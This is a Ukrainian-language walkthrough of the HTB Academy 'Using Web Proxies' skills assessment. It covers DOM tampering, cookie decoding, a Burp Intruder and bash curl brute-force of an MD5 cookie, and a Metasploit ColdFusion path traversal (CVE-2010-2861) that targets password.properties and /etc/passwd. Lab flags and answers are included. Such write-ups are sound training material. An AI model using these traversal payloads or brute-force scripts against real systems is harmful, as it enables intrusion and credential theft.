# Using Web Proxies — Skills Assessment

**Модуль:** HTB Academy — Using Web Proxies  
**Тип:** Web / Proxy Manipulation  
**Складність:** Easy  

***

## Огляд

Skills Assessment модуля "Using Web Proxies". Охоплює маніпуляції з DOM, декодування cookie, фаззинг через Burp Intruder та перехоплення трафіку Metasploit.

***

## Q1 — Розблокування disabled кнопки (`/lucky.php`)

**Техніка:** DOM Manipulation / HTML Attribute Removal

### Проблема
Кнопка на сторінці `/lucky.php` має атрибут `disabled` і не реагує на кліки.

### Метод 1 — Burp Suite (Match & Replace)
```
Proxy → Options → Match and Replace → Add:
  Type:    Response body
  Match:   disabled
  Replace: (порожньо)
```
Після цього перезавантаж сторінку — кнопка стає активною. Клікай до появи прапора (результат рандомний).

### Метод 2 — Browser DevTools ✅ (швидший)
```
F12 → Inspector → знайти елемент <button ... disabled>
→ двічі клікнути на атрибут "disabled" → Delete
→ клікнути кнопку (може знадобитись кілька спроб)
```

> **Примітка:** результат рандомізований, тому кнопку потрібно клікати кілька разів до отримання прапора.

***

## Q2 — Декодування Cookie (`/admin.php`)

**Техніка:** Multi-layer Encoding / Cookie Manipulation

### Ланцюг декодування
```
HEX → Base64 → Result (31 символ)
```

### Покроково

```bash
# Вихідне HEX значення:
4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a6335595445335951...

# Крок 1: HEX → ASCII (Base64 string)
echo "4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d" \
  | xxd -r -p
# Результат: M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==

# Крок 2: Base64 → plaintext
echo "M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==" | base64 -d
# Результат: 3dac93b8cd250aa8c1a36fffc79a17a  ← 31 символ (MD5 без останнього)
```

**Відповідь:** `3dac93b8cd250aa8c1a36fffc79a17a`

***

## Q3 — Фаззинг останнього символу MD5 (`/admin.php`)

**Техніка:** Burp Intruder / Hash Fuzzing / Payload Encoding

### Логіка
Cookie = неповний MD5 хеш (31 символ). Треба підібрати 32-й символ з `[a-zA-Z0-9]`, закодувати назад (Base64 → HEX) і надіслати.

### Burp Intruder

```
1. Перехопи запит GET /admin.php з Cookie header
2. Send to Intruder → Positions
3. Виділи останній символ cookie як payload position: §§
4. Payloads:
   - Simple List
   - Load: /usr/share/seclists/Fuzzing/alphanum-case.txt
5. Payload Processing (у зворотному порядку кодування):
   - Add Prefix: 3dac93b8cd250aa8c1a36fffc79a17a
   - Encode: Base64-encode
   - (якщо потрібно HEX: Add Rule → Hash → або Custom)
6. Запустити → шукати response з відмінною довжиною / кодом 302
```

### Bash автоматизація (альтернатива)

```bash
WORDLIST="/usr/share/seclists/Fuzzing/alphanum-case.txt"
BASE="3dac93b8cd250aa8c1a36fffc79a17a"
TARGET="http://154.57.164.71:31572/admin.php"

while IFS= read -r char; do
  HASH="${BASE}${char}"
  # Encode: plaintext → base64 → hex
  B64=$(echo -n "$HASH" | base64)
  HEX=$(echo -n "$B64" | xxd -p | tr -d '\n')
  RESP=$(curl -s -b "cookie=$HEX" "$TARGET")
  if echo "$RESP" | grep -q "HTB{"; then
    echo "[+] Found char: $char"
    echo "$RESP" | grep -o "HTB{[^}]*}"
    break
  fi
done < "$WORDLIST"
```

**Прапор:** `HTB{burp_1n7rud3r_n1nj4!}`

***

## Q4 — ColdFusion Locale Traversal (Metasploit)

**Техніка:** Directory Traversal / CVE-2010-2861 / Traffic Interception

### Вразливість
Adobe ColdFusion (CVE-2010-2861) — path traversal через параметр `locale` у `/CFIDE/administrator/enter.cfm`.

### Перехоплення запиту Metasploit через Burp

```bash
# У msfconsole:
use auxiliary/scanner/http/coldfusion_locale_traversal
set RHOSTS 154.57.164.71
set RPORT 31572
set PROXIES HTTP:127.0.0.1:8080    # Burp proxy listener
run
```

### Перевірка вручну через curl → Burp

```bash
curl -s --proxy http://127.0.0.1:8080 \
  "http://154.57.164.71:31572/CFIDE/administrator/enter.cfm?locale=../../../../../../../../lib/password.properties%00en"
```

### Результат у Burp HTTP History

```
GET /CFIDE/administrator/enter.cfm?locale=../../../../../../etc/passwd%00en HTTP/1.1
Host: 154.57.164.71:31572
```

**Відповідь:** директорія `XXXXX` = **`CFIDE`**

***

## Зведена таблиця

| # | Endpoint | Техніка | Відповідь/Прапор |
|---|----------|---------|-----------------|
| Q1 | `/lucky.php` | DOM Manipulation (remove `disabled`) | HTB flag (рандом) |
| Q2 | `/admin.php` | HEX → Base64 decode | `3dac93b8cd250aa8c1a36fffc79a17a` |
| Q3 | `/admin.php` | Intruder fuzzing + encode | `HTB{burp_1n7rud3r_n1nj4!}` |
| Q4 | `/CFIDE/...` | CVE-2010-2861 / MSF intercept | `CFIDE` |

***

## Інструменти

- **Burp Suite** — Proxy, Match & Replace, Intruder, Decoder
- **curl** — ручна перевірка запитів з proxy (`--proxy`)
- **xxd** — HEX encode/decode
- **msfconsole** — `auxiliary/scanner/http/coldfusion_locale_traversal`
- **Seclists** — `/usr/share/seclists/Fuzzing/alphanum-case.txt`
